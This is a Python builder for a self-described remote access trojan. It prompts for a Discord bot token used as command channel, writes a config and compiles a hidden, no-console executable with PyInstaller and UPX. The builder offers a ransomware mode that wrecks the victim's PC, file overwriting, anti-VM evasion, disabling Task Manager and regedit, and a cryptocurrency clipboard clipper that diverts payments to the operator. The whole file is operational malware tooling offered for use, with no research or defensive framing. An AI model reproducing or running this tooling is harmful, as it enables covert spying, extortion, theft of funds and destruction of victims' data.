from co.discordinv import discordinv
import subprocess,shutil,requests,os
def check_token(bot_token):
 if not bot_token:return False
 url="https://discord.com/api/v9/users/@me"
 headers={"Authorization":f"Bot {bot_token}"}
 try:
  response=requests.get(url,headers=headers)
  return response.status_code==200
 except requests.exceptions.RequestException:
  return False
def save_config(bot_token,crypto_address,enable_anti_restart,disable_features,enable_file_overwriting,enable_anti_vm,enable_clipper):
 config_dir="co"
 config_file=os.path.join(config_dir,"config.py")
 if not os.path.exists(config_dir):os.makedirs(config_dir)
 with open(config_file,"w")as file:
  file.write(f"import sys\n")
  file.write(f"sys.dont_write_bytecode=True\n")
  file.write(f"TOKEN='{bot_token}'\n")
  file.write(f"CRYPTO_ADDRESS='{crypto_address}'\n")
  file.write(f"ENABLE_ANTI_RESTART={enable_anti_restart}\n")
  file.write(f"ENABLE_FILE_OVERWRITING={enable_file_overwriting}\n")
  file.write(f"ANTI_VM={enable_anti_vm}\n")
  file.write(f"ENABLE_CLIPPER={enable_clipper}\n")
  file.write(f"DISABLE_FEATURES={disable_features}\n")
def run_build_script():
 bat_file=os.path.join("background","finalbuild.bat")
 try:
  subprocess.run([bat_file],check=True,shell=True)
 except subprocess.CalledProcessError:
  return False
 return True
def clean_up():
 try:
  os.remove("code.pyw")
  os.remove("main.pyw")
  shutil.rmtree("build")
  os.remove("main.spec")
 except Exception:pass
def build_project(icon_file=None):
 pyinstaller_command="pyinstaller --onefile --noconsole --upx-dir \"C:\\Program Files\\UPX\" "
 if icon_file:pyinstaller_command+=f"--icon \"{icon_file}\" "
 pyinstaller_command+="--exclude-module _lzma --exclude-module _multiprocessing --exclude-module attrs --exclude-module cryptography --exclude-module pytorch --exclude-module torch --exclude-module numpy --exclude-module Cython --exclude-module flask --exclude-module cv2 --exclude-module PyQt5 --exclude-module win32 --exclude-module yaml --exclude-module PythonWin --exclude-module jedi --exclude-module sounddevice --exclude-module google --exclude-module zstandard --hidden-import pyautogui \"main.pyw\""
 try:
  subprocess.run(pyinstaller_command,check=True,shell=True)
 except subprocess.CalledProcessError:
  return False
 return True
def main():
 print ("TRACKMAN REMOTE ACCESS TROJAN BY RAYWZW")
 bot_token=input("ENTER BOT TOKEN: ")
 while not check_token(bot_token):
  bot_token=input("INVALID TOKEN. ENTER A VALID BOT TOKEN: ")
 enable_anti_restart=input("ENABLE RANSOMWARE MODE? IF THIS IS ON YOU WONT BE ABLE TO SPY ON UR VICTIM DUE TO THEIR PC BEING COMPLETELY OBLITERATED! (Y/N): ").strip().upper()=='Y'
 enable_file_overwriting=input("ENABLE FILE OVERWRITING? (Y/N): ").strip().upper()=='Y'
 enable_anti_vm=input("ENABLE ANTI TRIAGE? (Y/N): ").strip().upper()=='Y'
 disable_features=input("DISABLE TASK MANAGER AND REGEDIT FOR THE VICTIM? (Y/N): ").strip().upper()=='Y'
 enable_clipper=input("ENABLE CLIPPER? (Y/N): ").strip().upper()=='Y'
 crypto_address=""
 if enable_clipper:crypto_address=input("ENTER YOUR CRYPTO ADDRESS: ").strip()
 save_config(bot_token,crypto_address,enable_anti_restart,disable_features,enable_file_overwriting,enable_anti_vm,enable_clipper)
 icon_file=input("ENTER ICON FILE PATH (press enter to skip): ").strip()
 if not icon_file:icon_file=None
 if run_build_script():
  if build_project(icon_file):clean_up()
 print(f"JOIN OUR DISCORD AT {discordinv}")
if __name__=="__main__":main()
